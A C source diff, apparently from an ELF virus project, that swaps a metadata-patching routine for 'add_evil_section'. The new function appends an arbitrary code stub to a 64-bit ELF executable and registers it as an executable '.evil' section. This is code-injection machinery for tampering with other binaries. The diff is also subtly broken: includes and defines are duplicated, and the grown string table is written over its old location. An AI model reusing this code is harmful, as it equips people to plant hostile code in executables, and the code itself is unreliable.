@@ -1,157 +1,193 @@
 #include "../include/death.h"
 
-int patch_meta_in_rx_segment(const char *path, const char *meta)
-{
-    printf("\n[DEBUG] patch_meta_in_rx_segment('%s')\n", path);
+#define NEW_SECTION_NAME ".evil"
 
+#include "../include/death.h"
+#include <elf.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define NEW_SECTION_NAME ".evil"
+
+int add_evil_section(const char *path, const unsigned char *stub, size_t stub_len)
+{
     FILE *f = fopen(path, "r+b");
-    if (!f) {
-        printf("[ERROR] fopen failed\n");
+    if (!f)
         return -1;
-    }
 
     Elf64_Ehdr eh;
     if (fread(&eh, 1, sizeof(eh), f) != sizeof(eh)) {
-        printf("[ERROR] fread ELF header failed\n");
         fclose(f);
         return -1;
     }
 
-    if (memcmp(eh.e_ident, ELFMAG, SELFMAG) != 0 ||
-        eh.e_ident[EI_CLASS] != ELFCLASS64) {
-        printf("[ERROR] Not a 64-bit ELF\n");
+    // Lire ancienne table des sections
+    if (eh.e_shoff == 0 || eh.e_shnum == 0) {
         fclose(f);
         return -1;
     }
 
-    printf("[DEBUG] e_entry = 0x%lx\n", eh.e_entry);
-
-    if (fseek(f, eh.e_phoff, SEEK_SET) != 0) {
-        printf("[ERROR] fseek to PHDR failed\n");
+    if (fseek(f, (long)eh.e_shoff, SEEK_SET) != 0) {
         fclose(f);
         return -1;
     }
 
-    if (eh.e_phnum == 0 || eh.e_phnum > 64) {
-        printf("[ERROR] Invalid e_phnum = %d\n", eh.e_phnum);
+    size_t old_shdr_size = eh.e_shnum * sizeof(Elf64_Shdr);
+    Elf64_Shdr *old_shdr = malloc(old_shdr_size);
+    if (!old_shdr) {
         fclose(f);
         return -1;
     }
 
-    Elf64_Phdr phdr[64];
-    if (fread(phdr, sizeof(Elf64_Phdr), eh.e_phnum, f) != (size_t)eh.e_phnum) {
-        printf("[ERROR] fread PHDR failed\n");
+    if (fread(old_shdr, sizeof(Elf64_Shdr), eh.e_shnum, f) != (size_t)eh.e_shnum) {
+        free(old_shdr);
         fclose(f);
         return -1;
     }
 
-    int rx_idx = -1;
-    Elf64_Addr entry = eh.e_entry;
-
-    for (int i = 0; i < eh.e_phnum; i++) {
-        if (phdr[i].p_type == PT_LOAD && (phdr[i].p_flags & PF_X)) {
-            Elf64_Addr start = phdr[i].p_vaddr;
-            Elf64_Addr end   = phdr[i].p_vaddr + phdr[i].p_memsz;
-
-            printf("[DEBUG] Checking RX segment %d: vaddr 0x%lx - 0x%lx\n",
-                   i, start, end);
-
-            if (entry >= start && entry < end) {
-                rx_idx = i;
-                printf("[DEBUG] -> Selected RX segment %d\n", i);
-                break;
-            }
-        }
-    }
-
-    if (rx_idx == -1) {
-        printf("[ERROR] No RX segment containing entry point\n");
+    // Lire .shstrtab existante
+    Elf64_Shdr shstr = old_shdr[eh.e_shstrndx];
+    char *shstrtab = malloc(shstr.sh_size);
+    if (!shstrtab) {
+        free(old_shdr);
         fclose(f);
         return -1;
     }
 
-    Elf64_Off rx_end = phdr[rx_idx].p_offset + phdr[rx_idx].p_filesz;
-    printf("[DEBUG] rx_end = 0x%lx (offset end of RX segment)\n", rx_end);
-
-    Elf64_Off next_off = (Elf64_Off)-1;
-    for (int i = 0; i < eh.e_phnum; i++) {
-        if (i == rx_idx)
-            continue;
-        if (phdr[i].p_offset > rx_end) {
-            if (next_off == (Elf64_Off)-1 || phdr[i].p_offset < next_off)
-                next_off = phdr[i].p_offset;
-        }
-    }
-
-    printf("[DEBUG] next segment offset = 0x%lx\n", next_off);
-
-    Elf64_Off limit = next_off;
-
-    if (eh.e_shoff > rx_end && eh.e_shoff < limit) {
-        printf("[DEBUG] e_shoff = 0x%lx is before next segment, using it\n", eh.e_shoff);
-        limit = eh.e_shoff;
-    }
-
-    if (limit == (Elf64_Off)-1) {
-        fseek(f, 0, SEEK_END);
-        long end = ftell(f);
-        limit = (Elf64_Off)end;
-        printf("[DEBUG] limit = EOF = 0x%lx\n", limit);
-    } else {
-        printf("[DEBUG] limit = 0x%lx\n", limit);
-    }
-
-    size_t meta_len = strlen(meta);
-    printf("[DEBUG] meta_len = %zu\n", meta_len);
-
-    const Elf64_Off align = 0x10;
-    Elf64_Off meta_off = (rx_end + (align - 1)) & ~(align - 1);
-
-    printf("[DEBUG] meta_off (aligned) = 0x%lx\n", meta_off);
-
-    if (meta_off + meta_len > limit) {
-        printf("[ERROR] Not enough space: meta_end=0x%lx > limit=0x%lx\n",
-               meta_off + meta_len, limit);
+    if (fseek(f, (long)shstr.sh_offset, SEEK_SET) != 0) {
+        free(old_shdr);
+        free(shstrtab);
         fclose(f);
         return -1;
     }
 
-    printf("[DEBUG] Writing meta at file offset 0x%lx\n", meta_off);
-
-    if (fseek(f, meta_off, SEEK_SET) != 0) {
-        printf("[ERROR] fseek to meta_off failed\n");
+    if (fread(shstrtab, 1, shstr.sh_size, f) != shstr.sh_size) {
+        free(old_shdr);
+        free(shstrtab);
         fclose(f);
         return -1;
     }
 
-    if (fwrite(meta, 1, meta_len, f) != meta_len) {
-        printf("[ERROR] fwrite meta failed\n");
+    // Ajouter ".evil" dans shstrtab (en mémoire)
+    size_t new_name_off   = shstr.sh_size;
+    size_t new_shstr_size = shstr.sh_size + strlen(NEW_SECTION_NAME) + 1;
+
+    char *new_shstrtab = realloc(shstrtab, new_shstr_size);
+    if (!new_shstrtab) {
+        free(old_shdr);
+        free(shstrtab);
+        fclose(f);
+        return -1;
+    }
+    shstrtab = new_shstrtab;
+
+    memcpy(shstrtab + new_name_off, NEW_SECTION_NAME, strlen(NEW_SECTION_NAME) + 1);
+
+    // Mettre à jour le header de .shstrtab
+    shstr.sh_size = new_shstr_size;
+    old_shdr[eh.e_shstrndx] = shstr;
+
+    // Écrire stub à la fin du fichier
+    if (fseek(f, 0, SEEK_END) != 0) {
+        free(old_shdr);
+        free(shstrtab);
         fclose(f);
         return -1;
     }
 
-    Elf64_Off new_end = meta_off + meta_len;
-    phdr[rx_idx].p_filesz = new_end - phdr[rx_idx].p_offset;
-    phdr[rx_idx].p_memsz  = phdr[rx_idx].p_filesz;
-
-    printf("[DEBUG] New p_filesz = 0x%lx\n", phdr[rx_idx].p_filesz);
-    printf("[DEBUG] New p_memsz  = 0x%lx\n", phdr[rx_idx].p_memsz);
-
-    if (fseek(f, eh.e_phoff, SEEK_SET) != 0) {
-        printf("[ERROR] fseek rewrite PHDR failed\n");
+    Elf64_Off stub_off = ftell(f);
+    if (fwrite(stub, 1, stub_len, f) != stub_len) {
+        free(old_shdr);
+        free(shstrtab);
         fclose(f);
         return -1;
     }
 
-    if (fwrite(phdr, sizeof(Elf64_Phdr), eh.e_phnum, f) != (size_t)eh.e_phnum) {
-        printf("[ERROR] fwrite PHDR failed\n");
+    // Construire nouveau header de section .evil
+    Elf64_Shdr newsec;
+    memset(&newsec, 0, sizeof(newsec));
+
+    newsec.sh_name      = new_name_off;
+    newsec.sh_type      = SHT_PROGBITS;
+    newsec.sh_flags     = SHF_ALLOC | SHF_EXECINSTR;
+    newsec.sh_offset    = stub_off;
+    newsec.sh_addr      = 0; // pas mappé (mais objdump le verra)
+    newsec.sh_size      = stub_len;
+    newsec.sh_addralign = 0x10;
+
+    // Construire nouvelle table des sections
+    size_t new_shnum     = eh.e_shnum + 1;
+    size_t new_shdr_size = new_shnum * sizeof(Elf64_Shdr);
+
+    Elf64_Shdr *new_shdr = malloc(new_shdr_size);
+    if (!new_shdr) {
+        free(old_shdr);
+        free(shstrtab);
         fclose(f);
         return -1;
     }
 
-    printf("[DEBUG] Patch applied successfully\n");
+    memcpy(new_shdr, old_shdr, old_shdr_size);
+    memcpy(&new_shdr[eh.e_shnum], &newsec, sizeof(newsec));
+
+    // Écrire la nouvelle .shstrtab à son offset d’origine
+    if (fseek(f, (long)shstr.sh_offset, SEEK_SET) != 0) {
+        free(old_shdr);
+        free(shstrtab);
+        free(new_shdr);
+        fclose(f);
+        return -1;
+    }
+
+    if (fwrite(shstrtab, 1, new_shstr_size, f) != new_shstr_size) {
+        free(old_shdr);
+        free(shstrtab);
+        free(new_shdr);
+        fclose(f);
+        return -1;
+    }
+
+    // Écrire la nouvelle table des sections à la fin
+    if (fseek(f, 0, SEEK_END) != 0) {
+        free(old_shdr);
+        free(shstrtab);
+        free(new_shdr);
+        fclose(f);
+        return -1;
+    }
+    Elf64_Off new_shoff = ftell(f);
+    if (fwrite(new_shdr, sizeof(Elf64_Shdr), new_shnum, f) != new_shnum) {
+        free(old_shdr);
+        free(shstrtab);
+        free(new_shdr);
+        fclose(f);
+        return -1;
+    }
+    // Mettre à jour ELF header
+    eh.e_shoff    = new_shoff;
+    eh.e_shnum    = new_shnum;
+    // e_shstrndx reste le même index, mais pointe vers la nouvelle taille
+    // (la section .shstrtab est toujours old_shdr[eh.e_shstrndx])
+    if (fseek(f, 0, SEEK_SET) != 0) {
+        free(old_shdr);
+        free(shstrtab);
+        free(new_shdr);
+        fclose(f);
+        return -1;
+    }
+    if (fwrite(&eh, 1, sizeof(eh), f) != sizeof(eh)) {
+        free(old_shdr);
+        free(shstrtab);
+        free(new_shdr);
+        fclose(f);
+        return -1;
+    }
 
     fclose(f);
+    free(old_shdr);
+    free(shstrtab);
+    free(new_shdr);
+
     return 0;
 }
-
